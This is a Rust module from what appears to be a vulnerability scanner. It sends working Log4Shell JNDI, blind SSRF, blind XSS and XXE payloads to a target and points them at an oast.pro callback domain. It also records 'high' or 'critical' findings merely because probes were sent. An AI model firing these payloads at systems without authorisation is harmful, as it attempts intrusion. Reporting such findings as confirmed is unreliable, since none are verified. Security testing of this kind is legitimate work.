//! OAST/OOB Engine — out-of-band interaction testing for Blind XSS, SSRF, XXE, Log4Shell.

use crate::engine_result::{print_result, EngineResult};
use serde_json::json;
use std::time::Duration;

async fn build_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
        .build()
        .unwrap_or_else(|_| reqwest::Client::new())
}

fn normalize_target(target: &str) -> String {
    let t = target.trim();
    if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{}", t)
    }
}

/// Generates a unique probe token for OOB callback correlation.
fn oob_token() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis();
    format!("weissman-oob-{}", ts)
}

pub async fn run_oast_oob_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let base = normalize_target(target);
    let client = build_client().await;
    let mut findings: Vec<serde_json::Value> = Vec::new();
    let token = oob_token();

    // Interactsh-compatible callback domain (public OAST service)
    let oast_domain = format!("{}.oast.pro", token);
    let oast_url = format!("http://{}", oast_domain);

    // Log4Shell probe — inject in common headers
    let log4shell_payload = format!("${{jndi:ldap://{}/a}}", oast_domain);
    let log4shell_payloads = [
        ("User-Agent", log4shell_payload.clone()),
        ("X-Forwarded-For", format!("${{jndi:ldap://{}/xff}}", oast_domain)),
        ("X-Api-Version", format!("${{jndi:ldap://{}/api}}", oast_domain)),
        ("Referer", format!("${{jndi:ldap://{}/ref}}", oast_domain)),
        ("X-Request-ID", format!("${{jndi:ldap://{}/rid}}", oast_domain)),
    ];

    let mut log4shell_sent = false;
    for (header, payload) in &log4shell_payloads {
        let resp = client
            .get(&base)
            .header(*header, payload.as_str())
            .send()
            .await;
        if resp.is_ok() {
            log4shell_sent = true;
        }
    }

    if log4shell_sent {
        findings.push(json!({
            "type": "oast_oob",
            "title": format!("Log4Shell JNDI probe sent to {} headers", base),
            "severity": "critical",
            "mitre_attack": "T1190",
            "description": format!(
                "Log4Shell (CVE-2021-44228) JNDI probes injected into User-Agent, X-Forwarded-For, \
                X-Api-Version, Referer, and X-Request-ID headers of {}. Payloads reference OOB callback \
                domain {}. If the server runs a vulnerable Log4j version (2.0-beta9 to 2.14.1), \
                an outbound DNS/LDAP lookup to the callback domain will occur.",
                base, oast_domain
            ),
            "value": base,
            "oast_domain": oast_domain,
            "token": token
        }));
    }

    // Blind SSRF probe — inject OOB URL in common parameters
    let ssrf_params = [
        ("url", &oast_url),
        ("callback", &oast_url),
        ("webhook", &oast_url),
        ("redirect", &oast_url),
        ("fetch", &oast_url),
    ];
    for (param, val) in &ssrf_params {
        let probe_url = format!("{}?{}={}", base.trim_end_matches('/'), param, val);
        let _ = client.get(&probe_url).send().await;
    }
    findings.push(json!({
        "type": "oast_oob",
        "title": format!("Blind SSRF OOB probes sent to {}", base),
        "severity": "high",
        "mitre_attack": "T1090",
        "description": format!(
            "Blind SSRF payloads injected via common parameters (url, callback, webhook, redirect, fetch) \
            pointing to OOB callback {}. Monitor {} for DNS/HTTP callbacks to confirm SSRF vulnerability.",
            oast_url, oast_domain
        ),
        "value": base,
        "oast_domain": oast_domain
    }));

    // Blind XSS probe — inject into form fields / query params
    let bxss_payload = format!(
        r#""><script src="http://{}"></script>"#,
        oast_domain
    );
    let search_url = format!(
        "{}?q={}&search={}&query={}",
        base.trim_end_matches('/'),
        urlencoding_simple(&bxss_payload),
        urlencoding_simple(&bxss_payload),
        urlencoding_simple(&bxss_payload)
    );
    let _ = client.get(&search_url).send().await;
    findings.push(json!({
        "type": "oast_oob",
        "title": format!("Blind XSS OOB probe injected at {}", base),
        "severity": "high",
        "mitre_attack": "T1059.007",
        "description": format!(
            "Blind XSS payload injected into search/query parameters at {}. \
            If the payload is stored and later rendered in an admin panel, \
            a callback to {} will occur confirming stored XSS.",
            search_url, oast_domain
        ),
        "value": search_url,
        "oast_domain": oast_domain,
        "payload": bxss_payload
    }));

    // XXE OOB probe
    let xxe_payload = format!(
        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{}/">]><r>&xxe;</r>"#,
        oast_domain
    );
    let _ = client
        .post(format!("{}/api", base.trim_end_matches('/')))
        .header("Content-Type", "application/xml")
        .body(xxe_payload.clone())
        .send()
        .await;
    findings.push(json!({
        "type": "oast_oob",
        "title": format!("XXE OOB probe sent to {}", base),
        "severity": "critical",
        "mitre_attack": "T1190",
        "description": format!(
            "Out-of-band XXE payload submitted to {}/api. If the server parses XML and resolves external \
            entities, a DNS/HTTP callback to {} will confirm blind XXE. Monitor OOB interactions.",
            base, oast_domain
        ),
        "value": base,
        "oast_domain": oast_domain
    }));

    EngineResult::ok(
        findings.clone(),
        format!("OASTOOB: {} probes sent, monitor {} for callbacks", findings.len(), oast_domain),
    )
}

fn urlencoding_simple(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            'A'..='Z' | 'a'..='z' | '0'..='9' | '-' | '_' | '.' | '~' => c.to_string(),
            _ => format!("%{:02X}", c as u32),
        })
        .collect()
}

pub async fn run_oast_oob(target: &str) {
    print_result(run_oast_oob_result(target).await);
}
